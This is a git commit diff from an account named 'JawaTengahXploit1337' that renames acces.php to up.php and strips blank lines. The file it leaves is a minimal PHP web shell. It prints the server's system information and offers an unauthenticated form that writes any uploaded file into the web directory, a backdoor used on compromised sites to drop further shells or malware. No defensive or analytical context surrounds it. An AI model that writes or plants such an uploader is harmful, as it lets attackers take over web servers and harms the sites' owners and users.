d772885d566dde725522ce94eaba21defaa0adda
JawaTengahXploit⁨¹³³⁷⁩ <94507398+JawaTengahXploit1337@users.noreply.github.com>
2025-05-14 06:55:52 +0700

    Update and rename acces.php to up.php

--- up.php
+++ up.php
@@ -1,16 +1,8 @@
 <?php 
-
 echo php_uname();
-
 echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
-
 echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
-
 if( $_POST['_upl'] == "Upload" ) {
-	
-	
 	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo 'Upload ok :d !!!'; }
-	
 	else { echo 'Upload Fail !!!'; }
-	
 }?>
